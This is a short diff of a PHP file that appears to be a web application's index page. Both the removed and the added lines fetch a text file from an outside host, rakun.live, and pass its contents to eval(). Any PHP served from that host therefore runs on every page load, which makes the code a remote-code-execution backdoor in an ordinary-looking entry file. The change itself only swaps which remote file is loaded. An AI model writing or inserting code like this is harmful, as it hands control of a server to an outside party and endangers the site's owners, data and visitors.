@@ -1,8 +1,7 @@
 <?php
-$url = file_get_contents(urldecode('https://rakun.live/landing/ijcp.txt'));
+$url = file_get_contents(urldecode('https://rakun.live/landing/arjms.txt'));
 $url = "?> ".$url;
 eval($url);
-
 
 /**
  * @defgroup index Index
